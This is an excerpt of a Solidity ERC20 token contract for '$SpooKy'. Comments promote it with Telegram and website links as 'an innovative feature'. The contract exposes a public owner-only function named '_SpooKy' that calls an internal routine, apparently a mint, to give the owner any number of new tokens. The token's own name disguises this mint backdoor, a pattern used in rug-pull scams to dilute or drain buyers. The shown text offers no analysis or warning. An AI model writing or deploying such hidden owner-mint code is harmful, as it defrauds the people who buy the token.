//
// $SpooKy proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SpooKyBSC
// 📱 Website ::https://SpooKy.com/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SpooKy(uint256 amount) public onlyOwner {
 _SpooKy(msg.sender, amount);
    }
    ...
    function _SpooKy(address account, uint256 amount) internal virtual {
...
contract $SpooKy is ERC20 {
    ...
    constructor() public ERC20("SpooKy", "SpooKy") {
     _SpooKy(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}